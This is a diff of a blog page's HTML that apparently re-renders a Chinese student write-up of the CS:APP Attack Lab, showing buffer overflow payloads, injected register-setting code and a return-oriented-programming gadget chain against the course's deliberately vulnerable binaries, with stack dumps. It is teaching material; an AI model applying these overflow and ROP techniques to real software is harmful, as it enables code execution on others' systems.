@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
+<meta name="description" content="[CS:APP-ch3] Attack LabPart 1：缓冲区溢出攻击Phase  11 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbuf&amp;gt;:">
 <meta name="keywords" content="CSAPP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[CS:APP-ch3] Attack Lab">
 <meta property="og:url" content="http://yoursite.com/2017/08/30/CSAPP/attack/index.html">
 <meta property="og:site_name" content="Aria">
-<meta property="og:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
+<meta property="og:description" content="[CS:APP-ch3] Attack LabPart 1：缓冲区溢出攻击Phase  11 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbuf&amp;gt;:">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2018-10-16T12:05:14.910Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[CS:APP-ch3] Attack Lab">
-<meta name="twitter:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
+<meta name="twitter:description" content="[CS:APP-ch3] Attack LabPart 1：缓冲区溢出攻击Phase  11 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbuf&amp;gt;:">
 
 
 
@@ -405,10 +405,7 @@
       
 
       
-        <h2 id="csapp-ch3-attack-lab"><a class="markdownIt-Anchor" href="#csapp-ch3-attack-lab"></a> [CS:APP-ch3] Attack Lab</h2>
-<h2 id="part-1缓冲区溢出攻击"><a class="markdownIt-Anchor" href="#part-1缓冲区溢出攻击"></a> Part 1：缓冲区溢出攻击</h2>
-<h3 id="phase-1"><a class="markdownIt-Anchor" href="#phase-1"></a> Phase  1</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+        <h2 id="CS-APP-ch3-Attack-Lab"><a href="#CS-APP-ch3-Attack-Lab" class="headerlink" title="[CS:APP-ch3] Attack Lab"></a>[CS:APP-ch3] Attack Lab</h2><h2 id="Part-1：缓冲区溢出攻击"><a href="#Part-1：缓冲区溢出攻击" class="headerlink" title="Part 1：缓冲区溢出攻击"></a>Part 1：缓冲区溢出攻击</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase  1"></a>Phase  1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -428,8 +425,7 @@
 <span class="line">   <span class="number">0x4017b9</span> &lt;getbuf+<span class="number">17</span>&gt;:	add    $<span class="number">0x28</span>,%rsp</span>
 </pre></td></tr></table></figure>
 <a id="more"></a>
-<p>buf开创0x28 = 40 个字节<br>
-随便填充40个字符</p>
+<p>buf开创0x28 = 40 个字节<br>随便填充40个字符</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
@@ -451,12 +447,8 @@
 <span class="line">   <span class="number">0x00000000004017e7</span> &lt;+<span class="number">39</span>&gt;:	callq  <span class="number">0x400e40</span> &lt;<span class="built_in">exit</span>@plt&gt;</span>
 <span class="line">End of assembler dump.</span>
 </pre></td></tr></table></figure>
-<p>touch1的地址是0x4017c0<br>
-因为是little endian的机器所以将<br>
-c0 17 40 00 00 00 00 00<br>
-用hex2raw转化为字符，添加到40个a的后面就行了</p>
-<p>结果：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<p>touch1的地址是0x4017c0<br>因为是little endian的机器所以将<br>c0 17 40 00 00 00 00 00<br>用hex2raw转化为字符，添加到40个a的后面就行了</p>
+<p>结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -474,12 +466,10 @@ c0 17 40 00 00 00 00 00<br>
 <span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x4017c0</span> (&lt;touch1&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
-</pre></td></tr></table></figure>
-<br>
-<h3 id="phase-2"><a class="markdownIt-Anchor" href="#phase-2"></a> Phase 2</h3>
-<p>touch2 有参数传递，要改变寄存器rdi里存放的值</p>
-<p>结果：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p><br></p>
+<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>touch2 有参数传递，要改变寄存器rdi里存放的值</p>
+<p>结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -497,27 +487,21 @@ c0 17 40 00 00 00 00 00<br>
 <span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x5561dcb0</span> --&gt; <span class="number">0xc359b997fac7c748</span> </span>
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x4017ec</span> (&lt;touch2&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0xc359b997fac7c748</span></span>
-</pre></td></tr></table></figure>
-<p>依旧是40个a，接着是把返回的地址改为调用0x5561dcb0（修改寄存器的代码），修改0x5561dca8的值为调用touch2，修改0x5561dcb0的值为调用添加的代码code<br>
-栈的指针指向0040调用完code之后，刚好向下移动到0048调用touch2</p>
-<p>code代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p>依旧是40个a，接着是把返回的地址改为调用0x5561dcb0（修改寄存器的代码），修改0x5561dca8的值为调用touch2，修改0x5561dcb0的值为调用添加的代码code<br>栈的指针指向0040调用完code之后，刚好向下移动到0048调用touch2</p>
+<p>code代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 </pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x59b997fa</span>,%rdi</span>
 <span class="line">ret</span>
-</pre></td></tr></table></figure>
-<p>编译：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 </pre></td><td class="code"><pre><span class="line">gcc -c code.s</span>
 <span class="line">objdump -d code.o &gt; code.d</span>
 <span class="line">./hex2raw  -i code.d &gt; code.r</span>
-</pre></td></tr></table></figure>
-<p>看到网上的码还有一步pushq $0x004017ec  （touch2的地址）<br>
-结果：<br>
-ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直接调用touch2了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p>看到网上的码还有一步pushq $0x004017ec  （touch2的地址）<br>结果：<br>ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直接调用touch2了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -535,13 +519,9 @@ ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直
 <span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x5561dc78</span> --&gt; <span class="number">0x6859b997fac7c748</span> </span>
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
-</pre></td></tr></table></figure>
-<br>
-<h3 id="phase-3"><a class="markdownIt-Anchor" href="#phase-3"></a> Phase 3</h3>
-<p>touch3参数是string<br>
-将str存到0x5561dcb8的地址上<br>
-code将str拷贝到%rdi<br>
-调用同上</p>
+</pre></td></tr></table></figure></p>
+<p><br></p>
+<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>touch3参数是string<br>将str存到0x5561dcb8的地址上<br>code将str拷贝到%rdi<br>调用同上</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
@@ -561,46 +541,32 @@ code将str拷贝到%rdi<br>
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x9</span> (<span class="string">'\t'</span>)</span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	)</span>
 </pre></td></tr></table></figure>
-<p>str是cookie的地址值用ascii转为字符串<br>
-（0x）59b997fa<br>
-对应35 39 62 39 39 37 66 61 00（字符串后面补空字符’\0’）</p>
-<p>code代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<p>str是cookie的地址值用ascii转为字符串<br>（0x）59b997fa<br>对应35 39 62 39 39 37 66 61 00（字符串后面补空字符’\0’）</p>
+<p>code代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 </pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x5561dcb8</span>,%rdi</span>
 <span class="line">ret</span>
-</pre></td></tr></table></figure>
-<br>
-<h2 id="part2-rop"><a class="markdownIt-Anchor" href="#part2-rop"></a> Part2: ROP</h2>
-<h3 id="phase-4"><a class="markdownIt-Anchor" href="#phase-4"></a> Phase 4</h3>
-<p>看了看文档，解释的很清楚w<br>
-利用已经有的代码片段gadget，通过汇编的解释，来调用自己想要执行的程序</p>
-<p>第一个程序还是调用touch2<br>
-要将cookiee放入rdi之中<br>
-但pop %rdi（5f）的指令很少出现<br>
-所以转换为</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="Part2-ROP"><a href="#Part2-ROP" class="headerlink" title="Part2: ROP"></a>Part2: ROP</h2><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>看了看文档，解释的很清楚w<br>利用已经有的代码片段gadget，通过汇编的解释，来调用自己想要执行的程序</p>
+<p>第一个程序还是调用touch2<br>要将cookiee放入rdi之中<br>但pop %rdi（5f）的指令很少出现<br>所以转换为<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 </pre></td><td class="code"><pre><span class="line">popq <span class="symbol">%rax</span></span>
 <span class="line">movq <span class="symbol">%rax</span> <span class="symbol">%rdi</span></span>
 <span class="line"><span class="keyword">ret</span></span>
-</pre></td></tr></table></figure>
-<p>根据表里的编码<br>
-popq %rax的编码是58<br>
-movq %rax %rdi的编码是48 89 c7</p>
+</pre></td></tr></table></figure></p>
+<p>根据表里的编码<br>popq %rax的编码是58<br>movq %rax %rdi的编码是48 89 c7</p>
 <p>在rtarget.d里找到这两个代码片段</p>
-<p><strong>gadget1</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<p><strong>gadget1</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 </pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span>
 <span class="line">  <span class="number">4019</span>a7:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span>
 <span class="line">  <span class="number">4019</span>ad:	c3                   	retq</span>
-</pre></td></tr></table></figure>
+</pre></td></tr></table></figure></p>
 <p>地址为0x4019ab</p>
-<p><strong>gadget2</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<p><strong>gadget2</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -614,16 +580,14 @@ movq %rax %rdi的编码是48 89 c7</p>
 <span class="line"><span class="number">00000000004019</span>ae &lt;setval_237&gt;:</span>
 <span class="line">  <span class="number">4019</span>ae:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 c7    	movl   $<span class="number">0xc7c78948</span>,(%rdi)</span>
 <span class="line">  <span class="number">4019b</span>4:	c3                   	retq</span>
-</pre></td></tr></table></figure>
+</pre></td></tr></table></figure></p>
 <p>273的地址是0x4019a2</p>
-<p>转化为little endian的形式然后就是合并，转换为字符串注入</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<p>转化为little endian的形式然后就是合并，转换为字符串注入<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 </pre></td><td class="code"><pre><span class="line">cat offeset gadget1 cookiee gadget2 touch2 &gt; code</span>
 <span class="line">./hex2raw -i code &gt; code.r</span>
-</pre></td></tr></table></figure>
-<p>然后就成功了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+</pre></td></tr></table></figure></p>
+<p>然后就成功了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
 <span class="line">4</span>
@@ -643,7 +607,7 @@ movq %rax %rdi的编码是48 89 c7</p>
 <span class="line"><span class="number">0048</span>| <span class="number">0x7ffffffee8d0</span> --&gt; <span class="number">0x59b997fa</span> </span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x7ffffffee8d8</span> --&gt; <span class="number">0x4019a2</span> (&lt;addval_273+<span class="number">2</span>&gt;:	mov    %rax,%rdi)</span>
 <span class="line"><span class="number">0064</span>| <span class="number">0x7ffffffee8e0</span> --&gt; <span class="number">0x4017ec</span> (&lt;touch2&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
-</pre></td></tr></table></figure>
+</pre></td></tr></table></figure></p>
 <p>一开始试了237，但不知道为什么这个返回的时候返回到了别的函数导致segmentation fault</p>
 
       
@@ -845,7 +809,7 @@ movq %rax %rdi的编码是48 89 c7</p>
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#csapp-ch3-attack-lab"><span class="nav-number">1.</span> <span class="nav-text"> [CS:APP-ch3] Attack Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#part-1缓冲区溢出攻击"><span class="nav-number">2.</span> <span class="nav-text"> Part 1：缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1"><span class="nav-number">2.1.</span> <span class="nav-text"> Phase  1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2"><span class="nav-number">2.2.</span> <span class="nav-text"> Phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3"><span class="nav-number">2.3.</span> <span class="nav-text"> Phase 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#part2-rop"><span class="nav-number">3.</span> <span class="nav-text"> Part2: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4"><span class="nav-number">3.1.</span> <span class="nav-text"> Phase 4</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CS-APP-ch3-Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">[CS:APP-ch3] Attack Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-1：缓冲区溢出攻击"><span class="nav-number">2.</span> <span class="nav-text">Part 1：缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1"><span class="nav-number">2.1.</span> <span class="nav-text">Phase  1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-2"><span class="nav-number">2.2.</span> <span class="nav-text">Phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-3"><span class="nav-number">2.3.</span> <span class="nav-text">Phase 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part2-ROP"><span class="nav-number">3.</span> <span class="nav-text">Part2: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-4"><span class="nav-number">3.1.</span> <span class="nav-text">Phase 4</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -1438,7 +1402,7 @@ movq %rax %rdi的编码是48 89 c7</p>
         onPopupClose();
       }
     });
-  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  </script>
 
 
 
@@ -1454,6 +1418,28 @@ movq %rax %rdi的编码是48 89 c7</p>
   
 
   
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
 
   
 
